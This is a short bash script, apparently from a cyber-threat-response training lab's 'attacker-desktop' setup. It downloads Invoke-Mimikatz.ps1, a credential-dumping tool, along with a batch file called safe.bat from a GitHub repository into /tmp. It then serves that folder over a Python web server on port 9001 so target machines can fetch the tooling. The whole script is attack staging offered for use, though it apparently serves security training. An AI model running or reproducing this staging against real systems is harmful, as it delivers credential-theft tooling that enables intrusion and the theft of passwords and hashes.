#!/bin/bash

wget https://raw.githubusercontent.com/mosesrenegade/cyber-threat-response-clinic/master/LIVE/attacker-desktop/Invoke-Mimikatz.ps1 -O /tmp/Invoke-Mimikatz.ps1

wget https://raw.githubusercontent.com/mosesrenegade/cyber-threat-response-clinic/master/LIVE/attacker-desktop/safe.bat -O /tmp/safe.bat

cd /tmp
python -m 'SimpleHTTPServer' 9001

